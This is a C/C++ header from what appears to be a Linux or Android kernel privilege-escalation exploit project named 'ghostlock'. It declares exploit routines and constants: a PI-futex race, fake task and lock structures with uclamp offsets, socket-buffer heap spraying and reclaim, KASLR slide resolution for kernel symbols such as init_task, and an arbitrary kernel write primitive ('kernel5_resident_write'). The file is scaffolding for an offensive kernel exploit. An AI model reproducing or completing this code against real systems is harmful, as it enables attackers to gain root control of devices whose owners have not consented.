#ifndef COMMON_H
#define COMMON_H

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#define __ARM 1

#include "offset.h"
#include "memory/address_space.h"
#include "memory/payload_builder.h"
#include "session/runtime_config.h"
#include "runtime_time.h"
#include "memory/heap_context.h"
#include "pi_race.h"

#define PAGE_SHIFT 12
#define PAGE_SIZE (1UL << PAGE_SHIFT)
#define KS_PAGE_SIZE 4096
#define KS_PAGE_MASK 0xfffULL

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <linux/memfd.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "kernelsnitch/utils.h"

#define SKB_DATA_DELTA (-0xe80LL)
#define MM_STRUCT_SZ 0x500

#define MM_ORDER 3
#define MM_PARTIALS 5
#define kernelsnitch_collisions() _RSO(kernelsnitch_collisions, 4)

#define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
#define SKB_RECLAIM_SENDS 4
#define FOPS_TABLE_OFF FOPS_OFF
#define SKB_FRAG_BIAS 0

#define FAKE_TASK_PRIO 120
#define FAKE_WAITER_PRIO 140
#define FAKE_TASK_UCLAMP_REQ_OFF 0x350
#define FAKE_TASK_UCLAMP_OFF 0x358
#define FAKE_UCLAMP_ACTIVE_BIT 16
#define FAKE_UCLAMP_MIN_ACTIVE (1U << FAKE_UCLAMP_ACTIVE_BIT)
#define FAKE_UCLAMP_MAX_ACTIVE \
  (1024U | (19U << 11) | (1U << FAKE_UCLAMP_ACTIVE_BIT))

#define TASK_COMM_LEN 16

#define PSELECT_ROUTE_NFDS 320
#define PSELECT_CONSUMER_NICE 19
#define PSELECT_CONSUMER_SETTLE_USEC 250000
#define SLIDE_NFULNL_LOGGER \
  resolved_addresses_data_alias(&g_resolved_addresses, SLIDE_NFULNL_LOGGER_IMAGE)
#define SLIDE_LOGGERS_0_1 \
  resolved_addresses_data_alias(&g_resolved_addresses, SLIDE_LOGGERS_0_1_IMAGE)
#define SLIDE_RANDOM_BOOT_ID_DATA \
  resolved_addresses_data_alias(&g_resolved_addresses, SLIDE_RANDOM_BOOT_ID_DATA_IMAGE)
#define SLIDE_INIT_TASK \
  resolved_addresses_data_alias(&g_resolved_addresses, SLIDE_INIT_TASK_IMAGE)
#define SLIDE_ROOT_TASK_GROUP \
  resolved_addresses_data_alias(&g_resolved_addresses, SLIDE_ROOT_TASK_GROUP_IMAGE)
#define SLIDE_SYSCTL_BOOTID \
  resolved_addresses_data_alias(&g_resolved_addresses, SLIDE_SYSCTL_BOOTID_IMAGE)

struct local_sched_attr {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint64_t sched_period;
};

extern ghostlock::memory::ResolvedAddresses &g_resolved_addresses;
extern TargetProfile &g_target_profile;

/* Measured direct-map end (defaults to the built-in bound). */
extern uint64_t g_direct_map_end;

namespace ghostlock::support {

void read_first_line(const char *path, char *buf, size_t len);

void log_startup_context(void);

void log_sync(void);

void disable_rseq_for_thread(void);

void init_p0_profile(void);

long futex_op(
        uint32_t *uaddr, int op, uint32_t val,
        const void *timeout_or_value, uint32_t *uaddr2, uint32_t val3);

long sched_setattr_tid(int tid, int nice_value);

void put64(unsigned char *p, size_t off, uint64_t value);

void put32(unsigned char *p, size_t off, uint32_t value);

pid_t clone_child(void);

pid_t clone_leak_child(void);

int open_memfd(pid_t child);

void kill_child(pid_t child);

void close_reclaim_sockets(void);

int quarantine_reclaim_sockets(void);

void release_quarantined_reclaim_sockets(void);

int stash_prebuilt_page(void);

int activate_prebuilt_page(void);

void discard_prebuilt_page(void);

void cleanup_page_prepare_state(void);

int clone_memfd(void);

void prepare_ctxs(void);

int prepare_skb_payload(uintptr_t base, const WriteRequest *request);

uintptr_t prepare_kernel_page(const WriteRequest *request);

uintptr_t prepare_good_kernel_page(const WriteRequest *request);

int tcp_route_selected(void);

int kernel5_route_selected(void);

}  // namespace ghostlock::support

namespace ghostlock::route {

void fdset_put_word(fd_set *set, int word, uint64_t value);

uint64_t fdset_get_word(const fd_set *set, int word);

void reserve_standard_io(void);

RouteStatus do_pselect_fake_lock_route(const WriteRequest *request);

RouteStatus do_tcp_fake_lock_route(const WriteRequest *request);

RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request);

int kernel5_resident_start(void);

int kernel5_resident_write(uintptr_t target, uintptr_t value);

void kernel5_resident_stop(void);

}  // namespace ghostlock::route

#include "runtime_struct_offsets.h"

#endif
